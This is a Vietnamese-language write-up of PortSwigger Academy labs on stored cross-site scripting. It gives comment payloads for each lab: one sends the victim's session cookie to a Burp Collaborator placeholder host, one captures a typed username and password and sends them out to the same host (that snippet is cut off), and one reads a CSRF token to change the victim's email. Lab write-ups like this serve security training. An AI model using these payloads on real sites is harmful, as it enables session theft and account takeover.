## 2. Lab: Exploiting cross-site scripting to steal cookies

* Content:
```
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

Note
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the cookie.
```
* Exploit:

Post comment như sau:

```javascript
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

Burp Collaborator đã log lại được comment body chứa cookie:

## 3. Lab: Exploiting cross-site scripting to capture passwords

* Content:
```
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

Note
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the credentials.
```
* Exploit:

Post comment nội dung như sau:

Payload:
```javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{

## 4. Lab: Exploiting XSS to perform CSRF

* Content:
```
This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: wiener:peter

Learning path
If you're following our suggested learning path, please note that this lab requires some understanding of topics that we haven't covered yet. Don't worry if you get stuck; try coming back later once you've developed your knowledge further.
```
* Exploit: 

Đăng nhập vào và check chức năng đổi mail => Sử dụng link `POST /my-account/change-email` với Data truyền vào là `email=wiener%40admin-user.net&csrf=smqFjQb05gI9NpKJ3xwDdifJ8fT1z5vM` 

<img width="373" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/6aa2cfe4-8cee-48cd-8b7a-d03ee8e453bd">

=> Data có bao gồm `token` => Vậy để khiến cho người dùng khác tự đổi password => Cần phải trigger cho user này vào link `/my-account` và bắt lại response chứa thông tin token => Đưa vào request thực hiện đổi Email.

Soạn nội dung comment như sau:
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
